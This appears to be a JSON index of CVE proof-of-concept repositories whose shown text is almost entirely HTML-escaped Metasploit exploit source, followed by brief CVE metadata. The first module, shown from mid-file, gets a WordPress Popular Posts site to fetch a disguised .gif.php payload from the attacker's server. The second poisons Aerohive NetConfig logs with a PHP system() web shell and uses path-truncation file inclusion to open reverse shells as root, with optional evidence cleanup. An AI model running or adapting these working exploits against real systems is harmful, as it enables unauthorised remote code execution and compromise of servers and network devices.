&#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;vars_get&#x27; =&gt; {        &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,        &#x27;tab&#x27; =&gt; &#x27;debug&#x27;      }    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200    res.body.include? &#x27; gd&#x27;  end  def get_wpp_admin_token(cookie)    vprint_status(&#x27;Retrieving wpp_admin token&#x27;)    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),      &#x27;method&#x27; =&gt; &#x27;GET&#x27;,      &#x27;cookie&#x27; =&gt; cookie,      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;vars_get&#x27; =&gt; {        &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,        &#x27;tab&#x27; =&gt; &#x27;tools&#x27;      }    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200    /&lt;input type=&quot;hidden&quot; id=&quot;wpp-admin-token&quot; name=&quot;wpp-admin-token&quot; value=&quot;([^&quot;]*)/ =~ res.body    Regexp.last_match(1)  end  def change_settings(cookie, token)    vprint_status(&#x27;Updating popular posts settings for images&#x27;)    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),      &#x27;method&#x27; =&gt; &#x27;POST&#x27;,      &#x27;cookie&#x27; =&gt; cookie,      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;vars_get&#x27; =&gt; {        &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,        &#x27;tab&#x27; =&gt; &#x27;debug&#x27;      },      &#x27;vars_post&#x27; =&gt; {        &#x27;upload_thumb_src&#x27; =&gt; &#x27;&#x27;,        &#x27;thumb_source&#x27; =&gt; &#x27;custom_field&#x27;,        &#x27;thumb_lazy_load&#x27; =&gt; 0,        &#x27;thumb_field&#x27; =&gt; &#x27;wpp_thumbnail&#x27;,        &#x27;thumb_field_resize&#x27; =&gt; 1,        &#x27;section&#x27; =&gt; &#x27;thumb&#x27;,        &#x27;wpp-admin-token&#x27; =&gt; token      }    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200    fail_with(Failure::UnexpectedReply, &#x27;Unable to save/change settings&#x27;) unless /&lt;strong&gt;Settings saved/ =~ res.body  end  def clear_cache(cookie, token)    vprint_status(&#x27;Clearing image cache&#x27;)    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),      &#x27;method&#x27; =&gt; &#x27;POST&#x27;,      &#x27;cookie&#x27; =&gt; cookie,      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;vars_get&#x27; =&gt; {        &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,        &#x27;tab&#x27; =&gt; &#x27;debug&#x27;      },      &#x27;vars_post&#x27; =&gt; {        &#x27;action&#x27; =&gt; &#x27;wpp_clear_thumbnail&#x27;,        &#x27;wpp-admin-token&#x27; =&gt; token      }    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200  end  def enable_custom_fields(cookie, custom_nonce, post)    # this should enable the ajax_nonce, it will 302 us back to the referer page as well so we can get it.    res = send_request_cgi!(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;post.php&#x27;),      &#x27;cookie&#x27; =&gt; cookie,      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;method&#x27; =&gt; &#x27;POST&#x27;,      &#x27;vars_post&#x27; =&gt; {        &#x27;toggle-custom-fields-nonce&#x27; =&gt; custom_nonce,        &#x27;_wp_http_referer&#x27; =&gt; &quot;#{normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;post.php&#x27;)}?post=#{post}&amp;action=edit&quot;,        &#x27;action&#x27; =&gt; &#x27;toggle-custom-fields&#x27;      }    )    /name=&quot;_ajax_nonce-add-meta&quot; value=&quot;([^&quot;]*)/ =~ res.body    Regexp.last_match(1)  end  def create_post(cookie)    vprint_status(&#x27;Creating new post&#x27;)    # get post ID and nonces    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;post-new.php&#x27;),      &#x27;cookie&#x27; =&gt; cookie,      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200    /name=&quot;_ajax_nonce-add-meta&quot; value=&quot;(?&lt;ajax_nonce&gt;[^&quot;]*)/ =~ res.body    /wp.apiFetch.nonceMiddleware = wp.apiFetch.createNonceMiddleware\\( &quot;(?&lt;wp_nonce&gt;[^&quot;]*)/ =~ res.body    /},&quot;post&quot;:{&quot;id&quot;:(?&lt;post_id&gt;\\d*)/ =~ res.body    if ajax_nonce.nil?      print_error(&#x27;missing ajax nonce field, attempting to re-enable. if this fails, you may need to change the interface to enable this.  See https://www.hostpapa.com/knowledgebase/add-custom-meta-boxes-wordpress-posts/. Or check (while writing a post) Options &gt; Preferences &gt; Panels &gt; Additional &gt; Custom Fields.&#x27;)      /name=&quot;toggle-custom-fields-nonce&quot; value=&quot;(?&lt;custom_nonce&gt;[^&quot;]*)/ =~ res.body      ajax_nonce = enable_custom_fields(cookie, custom_nonce, post_id)    end    unless ajax_nonce.nil?      vprint_status(&quot;ajax nonce: #{ajax_nonce}&quot;)    end    unless wp_nonce.nil?      vprint_status(&quot;wp nonce: #{wp_nonce}&quot;)    end    unless post_id.nil?      vprint_status(&quot;Created Post: #{post_id}&quot;)    end    fail_with(Failure::UnexpectedReply, &#x27;Unable to retrieve nonces and/or new post id&#x27;) unless ajax_nonce &amp;&amp; wp_nonce &amp;&amp; post_id    # publish new post    vprint_status(&quot;Writing content to Post: #{post_id}&quot;)    # this is very different from the EDB POC, I kept getting 200 to the home page with their example, so this is based off what the UI submits    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;),      &#x27;method&#x27; =&gt; &#x27;POST&#x27;,      &#x27;cookie&#x27; =&gt; cookie,      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;ctype&#x27; =&gt; &#x27;application/json&#x27;,      &#x27;accept&#x27; =&gt; &#x27;application/json&#x27;,      &#x27;vars_get&#x27; =&gt; {        &#x27;_locale&#x27; =&gt; &#x27;user&#x27;,        &#x27;rest_route&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp&#x27;, &#x27;v2&#x27;, &#x27;posts&#x27;, post_id)      },      &#x27;data&#x27; =&gt; {        &#x27;id&#x27; =&gt; post_id,        &#x27;title&#x27; =&gt; Rex::Text.rand_text_alphanumeric(20..30),        &#x27;content&#x27; =&gt; &quot;&lt;!-- wp:paragraph --&gt;\\n&lt;p&gt;#{Rex::Text.rand_text_alphanumeric(100..200)}&lt;/p&gt;\\n&lt;!-- /wp:paragraph --&gt;&quot;,        &#x27;status&#x27; =&gt; &#x27;publish&#x27;      }.to_json,      &#x27;headers&#x27; =&gt; {        &#x27;X-WP-Nonce&#x27; =&gt; wp_nonce,        &#x27;X-HTTP-Method-Override&#x27; =&gt; &#x27;PUT&#x27;      }    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200    fail_with(Failure::UnexpectedReply, &#x27;Post failed to publish&#x27;) unless res.body.include? &#x27;&quot;status&quot;:&quot;publish&quot;&#x27;    return post_id, ajax_nonce, wp_nonce  end  def add_meta(cookie, post_id, ajax_nonce, payload_name)    payload_url = &quot;http://#{datastore[&#x27;SRVHOSTNAME&#x27;]}:#{datastore[&#x27;SRVPORT&#x27;]}/#{payload_name}&quot;    vprint_status(&quot;Adding malicious metadata for redirect to #{payload_url}&quot;)    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;admin-ajax.php&#x27;),      &#x27;method&#x27; =&gt; &#x27;POST&#x27;,      &#x27;cookie&#x27; =&gt; cookie,      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;vars_post&#x27; =&gt; {        &#x27;_ajax_nonce&#x27; =&gt; 0,        &#x27;action&#x27; =&gt; &#x27;add-meta&#x27;,        &#x27;metakeyselect&#x27; =&gt; &#x27;wpp_thumbnail&#x27;,        &#x27;metakeyinput&#x27; =&gt; &#x27;&#x27;,        &#x27;metavalue&#x27; =&gt; payload_url,        &#x27;_ajax_nonce-add-meta&#x27; =&gt; ajax_nonce,        &#x27;post_id&#x27; =&gt; post_id      }    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200    fail_with(Failure::UnexpectedReply, &#x27;Failed to update metadata&#x27;) unless res.body.include? &quot;&lt;tr id=&#x27;meta-&quot;  end  def boost_post(cookie, post_id, wp_nonce, post_count)    # redirect as needed    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;),      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,      &#x27;cookie&#x27; =&gt; cookie,      &#x27;vars_get&#x27; =&gt; { &#x27;page_id&#x27; =&gt; post_id }    )    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200 -- res.code == 301    print_status(&quot;Sending #{post_count} views to #{res.headers[&#x27;Location&#x27;]}&quot;)    location = res.headers[&#x27;Location&#x27;].split(&#x27;/&#x27;)[3...-1].join(&#x27;/&#x27;) # http://example.com/&lt;take this value&gt;/&lt;and anything after&gt;    (1..post_count).each do -_c-      res = send_request_cgi!(        &#x27;uri&#x27; =&gt; &quot;/#{location}&quot;,        &#x27;cookie&#x27; =&gt; cookie,        &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;      )      # just send away, who cares about the response      fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res      fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200      res = send_request_cgi(        # this URL varies from the POC on EDB, and is modeled after what the browser does        &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;),        &#x27;vars_get&#x27; =&gt; {          &#x27;rest_route&#x27; =&gt; normalize_uri(&#x27;wordpress-popular-posts&#x27;, &#x27;v1&#x27;, &#x27;popular-posts&#x27;)        },        &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,        &#x27;method&#x27; =&gt; &#x27;POST&#x27;,        &#x27;cookie&#x27; =&gt; cookie,        &#x27;vars_post&#x27; =&gt; {          &#x27;_wpnonce&#x27; =&gt; wp_nonce,          &#x27;wpp_id&#x27; =&gt; post_id,          &#x27;sampling&#x27; =&gt; 0,          &#x27;sampling_rate&#x27; =&gt; 100        }      )      fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res      fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 201    end    fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res  end  def get_top_posts    print_status(&#x27;Determining post with most views&#x27;)    res = get_widget    /&gt;(?&lt;views&gt;\\d+) views&lt;/ =~ res.body    views = views.to_i    print_status(&quot;Top Views: #{views}&quot;)    views += 5 # make us the top post    unless datastore[&#x27;VISTS&#x27;].nil?      print_status(&quot;Overriding post count due to VISITS being set, from #{views} to #{datastore[&#x27;VISITS&#x27;]}&quot;)      views = datastore[&#x27;VISITS&#x27;]    end    views  end  def get_widget    # load home page to grab the widget ID. At times we seem to hit the widget when it&#x27;s refreshing and it doesn&#x27;t respond    # which then would kill the exploit, so in this case we just keep trying.    (1..10).each do -_-      @res = send_request_cgi(        &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path),        &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;      )      break unless @res.nil?    end    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless @res.code == 200    /data-widget-id=&quot;wpp-(?&lt;widget_id&gt;\\d+)/ =~ @res.body    # load the widget directly    (1..10).each do -_-      @res = send_request_cgi(        &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;, &#x27;wp-json&#x27;, &#x27;wordpress-popular-posts&#x27;, &#x27;v1&#x27;, &#x27;popular-posts&#x27;, &#x27;widget&#x27;, widget_id),        &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,        &#x27;vars_get&#x27; =&gt; {          &#x27;is_single&#x27; =&gt; 0        }      )      break unless @res.nil?    end    fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless @res.code == 200    @res  end  def exploit    fail_with(Failure::BadConfig, &#x27;SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful&#x27;) if datastore[&#x27;SRVHOST&#x27;] == &#x27;0.0.0.0&#x27;    cookie = wordpress_login(datastore[&#x27;USERNAME&#x27;], datastore[&#x27;PASSWORD&#x27;])    if cookie.nil?      vprint_error(&#x27;Invalid login, check credentials&#x27;)      return    end    payload_name = &quot;#{Rex::Text.rand_text_alphanumeric(5..8)}.gif.php&quot;    vprint_status(&quot;Payload file name: #{payload_name}&quot;)    fail_with(Failure::NotVulnerable, &#x27;gd is not installed on server, uexploitable&#x27;) unless check_gd_installed(cookie)    post_count = get_top_posts    # we dont need to pass the cookie anymore since its now saved into http client    token = get_wpp_admin_token(cookie)    vprint_status(&quot;wpp_admin_token: #{token}&quot;)    change_settings(cookie, token)    clear_cache(cookie, token)    post_id, ajax_nonce, wp_nonce = create_post(cookie)    print_status(&#x27;Starting web server to handle request for image payload&#x27;)    start_service({      &#x27;Uri&#x27; =&gt; {        &#x27;Proc&#x27; =&gt; proc { -cli, req- on_request_uri(cli, req, payload_name, post_id) },        &#x27;Path&#x27; =&gt; &quot;/#{payload_name}&quot;      }    })    add_meta(cookie, post_id, ajax_nonce, payload_name)    boost_post(cookie, post_id, wp_nonce, post_count)    print_status(&#x27;Waiting 90sec for cache refresh by server&#x27;)    Rex.sleep(90)    print_status(&#x27;Attempting to force loading of shell by visiting to homepage and loading the widget&#x27;)    res = get_widget    print_good(&#x27;We made it to the top!&#x27;) if res.body.include? payload_name    # if res.body.include? datastore[&#x27;SRVHOSTNAME&#x27;]    #  fail_with(Failure::UnexpectedReply, &quot;Found #{datastore[&#x27;SRVHOSTNAME&#x27;]} in page content. Payload likely wasn&#x27;t copied to the server.&quot;)    # end    # at this point, we rely on our web server getting requests to make the rest happen  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::Remote::HttpClient  include Msf::Exploit::CmdStager  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = {})    super(      update_info(        info,        &#x27;Name&#x27; =&gt; &#x27;Aerohive NetConfig 10.0r8a LFI and log poisoning to RCE&#x27;,        &#x27;Description&#x27; =&gt; %q{          This module exploits LFI and log poisoning vulnerabilities          (CVE-2020-16152) in Aerohive NetConfig, version 10.0r8a          build-242466 and older in order to achieve unauthenticated remote          code execution as the root user. NetConfig is the Aerohive/Extreme          Networks HiveOS administrative webinterface. Vulnerable versions          allow for LFI because they rely on a version of PHP 5 that is          vulnerable to string truncation attacks. This module leverages this          issue in conjunction with log poisoning to gain RCE as root.          Upon successful exploitation, the Aerohive NetConfig application          will hang for as long as the spawned shell remains open. Closing          the session should render the app responsive again.          The module provides an automatic cleanup option to clean the log.          However, this option is disabled by default because any modifications          to the /tmp/messages log, even via sed, may render the target          (temporarily) unexploitable. This state can last over an hour.          This module has been successfully tested against Aerohive NetConfig          versions 8.2r4 and 10.0r7a.        },        &#x27;License&#x27; =&gt; MSF_LICENSE,        &#x27;Author&#x27; =&gt; [          &#x27;Erik de Jong&#x27;, # github.com/eriknl - discovery and PoC          &#x27;Erik Wynter&#x27; # @wyntererik - Metasploit        ],        &#x27;References&#x27; =&gt; [          [&#x27;CVE&#x27;, &#x27;2020-16152&#x27;], # still categorized as RESERVED          [&#x27;URL&#x27;, &#x27;https://github.com/eriknl/CVE-2020-16152&#x27;] # analysis and PoC code        ],        &#x27;DefaultOptions&#x27; =&gt; {          &#x27;SSL&#x27; =&gt; true,          &#x27;RPORT&#x27; =&gt; 443        },        &#x27;Platform&#x27; =&gt; %w[linux unix],        &#x27;Arch&#x27; =&gt; [ ARCH_ARMLE, ARCH_CMD ],        &#x27;Targets&#x27; =&gt; [          [            &#x27;Linux&#x27;, {              &#x27;Arch&#x27; =&gt; [ARCH_ARMLE],              &#x27;Platform&#x27; =&gt; &#x27;linux&#x27;,              &#x27;DefaultOptions&#x27; =&gt; {                &#x27;PAYLOAD&#x27; =&gt; &#x27;linux/armle/meterpreter/reverse_tcp&#x27;,                &#x27;CMDSTAGER::FLAVOR&#x27; =&gt; &#x27;curl&#x27;              }            }          ],          [            &#x27;CMD&#x27;, {              &#x27;Arch&#x27; =&gt; [ARCH_CMD],              &#x27;Platform&#x27; =&gt; &#x27;unix&#x27;,              &#x27;DefaultOptions&#x27; =&gt; {                &#x27;PAYLOAD&#x27; =&gt; &#x27;cmd/unix/reverse_openssl&#x27; # this may be the only payload that works for this target&#x27;              }            }          ]        ],        &#x27;Privileged&#x27; =&gt; true,        &#x27;DisclosureDate&#x27; =&gt; &#x27;2020-02-17&#x27;,        &#x27;DefaultTarget&#x27; =&gt; 0,        &#x27;Notes&#x27; =&gt; {          &#x27;Stability&#x27; =&gt; [ CRASH_SAFE ],          &#x27;SideEffects&#x27; =&gt; [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],          &#x27;Reliability&#x27; =&gt; [ REPEATABLE_SESSION ]        }      )    )    register_options [      OptString.new(&#x27;TARGETURI&#x27;, [true, &#x27;The base path to Aerohive NetConfig&#x27;, &#x27;/&#x27;]),      OptBool.new(&#x27;AUTO_CLEAN_LOG&#x27;, [true, &#x27;Automatically clean the /tmp/messages log upon spawning a shell. WARNING! This may render the target unexploitable&#x27;, false]),    ]  end  def auto_clean_log    datastore[&#x27;AUTO_CLEAN_LOG&#x27;]  end  def check    res = send_request_cgi({      &#x27;method&#x27; =&gt; &#x27;GET&#x27;,      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php5&#x27;)    })    unless res      return CheckCode::Unknown(&#x27;Connection failed.&#x27;)    end    unless res.code == 200 &amp;&amp; res.body.include?(&#x27;Aerohive NetConfig UI&#x27;)      return CheckCode::Safe(&#x27;Target is not an Aerohive NetConfig application.&#x27;)    end    version = res.body.scan(/action=&quot;login\\.php5\\?version=(.*?)&quot;/)&amp;.flatten&amp;.first    unless version      return CheckCode::Detected(&#x27;Could not determine Aerohive NetConfig version.&#x27;)    end    begin      if Rex::Version.new(version) &lt;= Rex::Version.new(&#x27;10.0r8a&#x27;)        return CheckCode::Appears(&quot;The target is Aerohive NetConfig version #{version}&quot;)      else        print_warning(&#x27;It should be noted that it is unclear if/when this issue was patched, so versions after 10.0r8a may still be vulnerable.&#x27;)        return CheckCode::Safe(&quot;The target is Aerohive NetConfig version #{version}&quot;)      end    rescue StandardError =&gt; e      return CheckCode::Unknown(&quot;Failed to obtain a valid Aerohive NetConfig version: #{e}&quot;)    end  end  def poison_log    password = rand_text_alphanumeric(8..12)    @shell_cmd_name = rand_text_alphanumeric(3..6)    @poison_cmd = &quot;&lt;?php system($_POST[&#x27;#{@shell_cmd_name}&#x27;]);?&gt;&quot;    # Poison /tmp/messages    print_status(&#x27;Attempting to poison the log at /tmp/messages...&#x27;)    res = send_request_cgi({      &#x27;method&#x27; =&gt; &#x27;POST&#x27;,      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;login.php5&#x27;),      &#x27;vars_post&#x27; =&gt; {        &#x27;login_auth&#x27; =&gt; 0,        &#x27;miniHiveUI&#x27; =&gt; 1,        &#x27;authselect&#x27; =&gt; &#x27;Name/Password&#x27;,        &#x27;userName&#x27; =&gt; @poison_cmd,        &#x27;password&#x27; =&gt; password      }    })    unless res      fail_with(Failure::Disconnected, &#x27;Connection failed while trying to poison the log at /tmp/messages&#x27;)    end    unless res.code == 200 &amp;&amp; res.body.include?(&#x27;cmn/redirectLogin.php5?ERROR_TYPE=MQ==&#x27;)      fail_with(Failure::UnexpectedReply, &#x27;Unexpected response received while trying to poison the log at /tmp/messages&#x27;)    end    print_status(&#x27;Server responded as expected. Continuing...&#x27;)  end  def on_new_session(session)    log_cleaned = false    if auto_clean_log      print_status(&#x27;Attempting to clean the log file at /tmp/messages...&#x27;)      print_warning(&#x27;Please note this will render the target (temporarily) unexploitable. This state can last over an hour.&#x27;)      begin        # We need remove the line containing the PHP system call from /tmp/messages        # The special chars in the PHP syscall make it nearly impossible to use sed to replace the PHP syscall with a regular username.        # Instead, let&#x27;s avoid special chars by stringing together some grep commands to make sure we have the right line and then removing that entire line        # The impact of using sed to edit the file on the fly and using grep to create a new file and overwrite /tmp/messages with it, is the same:        # In both cases the app will likely stop writing to /tmp/messages for quite a while (could be over an hour), rendering the target unexploitable during that period.        line_to_delete_file = &quot;/tmp/#{rand_text_alphanumeric(5..10)}&quot;        clean_messages_file = &quot;/tmp/#{rand_text_alphanumeric(5..10)}&quot;        cmds_to_clean_log = &quot;grep #{@shell_cmd_name} /tmp/messages - grep POST - grep &#x27;php system&#x27; &gt; #{line_to_delete_file}; &quot;\\        &quot;grep -vFf #{line_to_delete_file} /tmp/messages &gt; #{clean_messages_file}; mv #{clean_messages_file} /tmp/messages; rm -f #{line_to_delete_file}&quot;        if session.type.to_s.eql? &#x27;meterpreter&#x27;          session.core.use &#x27;stdapi&#x27; unless session.ext.aliases.include? &#x27;stdapi&#x27;          session.sys.process.execute(&#x27;/bin/sh&#x27;, &quot;-c \\&quot;#{cmds_to_clean_log}\\&quot;&quot;)          # Wait for cleanup          Rex.sleep 5          # Check for the PHP system call in /tmp/messages          messages_contents = session.fs.file.open(&#x27;/tmp/messages&#x27;).read.to_s          # using =~ here produced unexpected results, so include? is used instead          unless messages_contents.include?(@poison_cmd)            log_cleaned = true          end        elsif session.type.to_s.eql?(&#x27;shell&#x27;)          session.shell_command_token(cmds_to_clean_log.to_s)          # Check for the PHP system call in /tmp/messages          poison_evidence = session.shell_command_token(&quot;grep #{@shell_cmd_name} /tmp/messages - grep POST - grep &#x27;php system&#x27;&quot;)          # using =~ here produced unexpected results, so include? is used instead          unless poison_evidence.include?(@poison_cmd)            log_cleaned = true          end        end      rescue StandardError =&gt; e        print_error(&quot;Error during cleanup: #{e.message}&quot;)      ensure        super      end      unless log_cleaned        print_warning(&quot;Could not replace the PHP system call &#x27;#{@poison_cmd}&#x27; in /tmp/messages&quot;)      end    end    if log_cleaned      print_good(&#x27;Successfully cleaned up the log by deleting the line with the PHP syscal from /tmp/messages.&#x27;)    else      print_warning(&quot;Erasing the log poisoning evidence will require manually editing/removing the line in /tmp/messages that contains the poison command:\\n\\t#{@poison_cmd}&quot;)      print_warning(&#x27;Please note that any modifications to /tmp/messages, even via sed, will render the target (temporarily) unexploitable. This state can last over an hour.&#x27;)      print_warning(&#x27;Deleting /tmp/messages or clearing out the file may break the application.&#x27;)    end  end  def execute_command(cmd, _opts = {})    print_status(&#x27;Attempting to execute the payload&#x27;)    send_request_cgi({      &#x27;method&#x27; =&gt; &#x27;POST&#x27;,      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;action.php5&#x27;),      &#x27;vars_get&#x27; =&gt; {        &#x27;_action&#x27; =&gt; &#x27;list&#x27;,        &#x27;debug&#x27; =&gt; &#x27;true&#x27;      },      &#x27;vars_post&#x27; =&gt; {        &#x27;_page&#x27; =&gt; rand_text_alphanumeric(1) + &#x27;/..&#x27; * 8 + &#x27;/&#x27; * 4041 + &#x27;/tmp/messages&#x27;,  # Trigger LFI through path truncation        @shell_cmd_name =&gt; cmd      }    }, 0)    print_warning(&#x27;In case of successful exploitation, the Aerohive NetConfig web application will hang for as long as the spawned shell remains open.&#x27;)  end  def exploit    poison_log    if target.arch.first == ARCH_CMD      print_status(&#x27;Executing the payload&#x27;)      execute_command(payload.encoded)    else      execute_cmdstager(background: true)    end  endend",
      "date": "2022-01-02",
      "raw_date": "2022-01-02T08:08:00Z"
    },
    {
      "cve_id": "CVE-2016-10555",
      "repo_info": "[scent2d/PoC-CVE-2016-10555](https://github.com/scent2d/PoC-CVE-2016-10555)",
      "description": "CVE-2016-10555 PoC code",
      "date": "2022-01-02",
      "raw_date": "2022-01-02T15:02:59Z"
    }
  ],
  "generated_at": "2025-11-30T01:07:34.933527",
  "metadata": {
    "total_cves": 3,
    "date_range": "2022-01-02",
    "source": "README.md",
    "script_version": "2.0"
  }
}